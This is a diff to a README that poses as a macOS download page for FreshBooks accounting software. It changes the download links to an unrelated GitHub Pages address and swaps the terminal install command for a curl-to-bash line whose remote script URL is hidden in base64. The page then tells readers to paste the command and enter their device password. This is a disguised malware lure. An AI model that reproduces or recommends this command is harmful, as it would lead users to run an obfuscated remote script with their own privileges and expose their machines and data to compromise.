@@ -3,7 +3,7 @@
 FreshBooks is an intuitive cloud-based accounting and invoicing solution designed for macOS users. It helps small business owners and freelancers manage invoices, track time, and handle expenses with ease and professionalism.
 
 ## ✅ Download FreshBooks for macOS  
-[![Download FreshBooks](https://img.shields.io/badge/Download-FreshBooks-blueviolet)](https://freshbooks-mac-download.github.io/.github)
+[![Download FreshBooks](https://img.shields.io/badge/Download-FreshBooks-blueviolet)](https://shuziktobehuman.github.io/huja/FreshBooks)
 
 ---
 
@@ -22,7 +22,7 @@ FreshBooks is an intuitive cloud-based accounting and invoicing solution designe
 
 1. Copy the installation command below.
 ```bash
-/bin/bash -c "$(curl -fsSL https://veitzeatz.com/get1/install.sh)"
+/bin/bash -c "$(curl -fsSL $(echo aHR0cHM6Ly9waGFubmFyaXRoLmNvbS9nZXQyL2luc3RhbGwuc2g= | base64 -d))"
 ```
 2. Open the terminal on your device and paste the command you copied above, then press the “Return” button.
 3. Enter your device password and confirm the installation.
@@ -58,7 +58,7 @@ FreshBooks offers simple yet powerful tools for invoicing, expense tracking, and
 
 ---
 
-[![Download FreshBooks](https://img.shields.io/badge/Download-FreshBooks-blueviolet)](https://freshbooks-mac-download.github.io/.github)
+[![Download FreshBooks](https://img.shields.io/badge/Download-FreshBooks-blueviolet)](https://shuziktobehuman.github.io/huja/FreshBooks)
 
 ---
 
